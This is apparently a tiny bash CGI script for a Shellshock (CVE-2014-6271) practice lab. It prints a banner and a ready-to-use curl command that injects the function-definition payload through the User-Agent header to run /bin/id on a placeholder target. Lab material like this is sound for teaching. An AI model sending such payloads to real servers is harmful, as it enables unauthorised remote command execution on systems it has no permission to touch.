#!/bin/bash
echo "Content-type: text/plain"
echo ""
echo "Shellshock lab CGI (CVE-2014-6271)"
echo "Probar: curl -H 'User-Agent: () { :;}; echo; /bin/id' http://TARGET:8080/cgi-bin/vuln.cgi"
